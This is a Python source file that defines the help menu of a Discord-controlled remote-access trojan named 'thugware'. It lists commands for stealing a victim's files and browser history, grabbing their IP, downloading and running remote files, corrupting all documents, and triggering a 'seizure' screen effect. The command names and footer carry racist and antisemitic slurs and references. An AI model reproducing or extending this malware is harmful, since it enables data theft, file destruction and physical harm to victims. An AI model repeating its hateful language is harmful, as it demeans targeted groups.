import discord
from discord.ext import commands

async def help_command(ctx):
    command_list = {
        'admin': 'Ask to run the thugware as admin',
        'bassboost': 'This forces the volume at 100',
        'blur': 'Extreme GDI blurring',
        'cd': 'Navigate through the victim\'s files',
        'clean': 'Remove the channels except the current one',
        'errorspamz': 'Funny error spam',
        'getbrowserhistory': 'Fetch the browser history.',
        'getfiles': 'Use this to steal files',
        'ip': 'Get the IP address of the victim.',
        'kkk': 'KKK memes fly everywhere',
        'kp': 'kill proccess',
        'linkshare': 'download and run a url file on the victims pc',
        'lp': 'List active processes.',
        'melt': 'Screen melt effect',
        'openurl': 'Open a website in the browser',
        'playsound': 'Background music, just upload a file',
        'restartpc': 'Restart the PC.',
        'search': 'Web search',
        'screenswipe': 'The entire screen swipes and bends',
        'setvol': 'Change the users volume',
        'share': 'Upload and run a file',
        'seizure': 'Give the victim a seizure',
        'hitlermode':'active or deactive hitler mode for the victim',
        'speak': 'Speak the given message out loud.',
        'ss': 'Snip a screenshot',
        'sysinfo': 'Get system information.',
        'thugfiles': 'Rename and corrupt all files in downloads/documents for good',
        'tree': 'get file tree',
        'tornado': 'Screen tornado',
        'wallpaper': 'Change the wallpaper.',
        'close': 'Close the current program.',
        'help': 'Show this help message.'
    }

    sorted_command_list = sorted(command_list.items())
    command_text = "\n".join(f"`{command}`: {description}" for command, description in sorted_command_list)

    embed = discord.Embed(
        title="Available Commands",
        description=command_text,
        color=0x00ff00
    )
    embed.set_footer(text="THUGWARE\nBY GEORGE FLOYD NEGROID INDUSTRIES")

    await ctx.send(embed=embed)
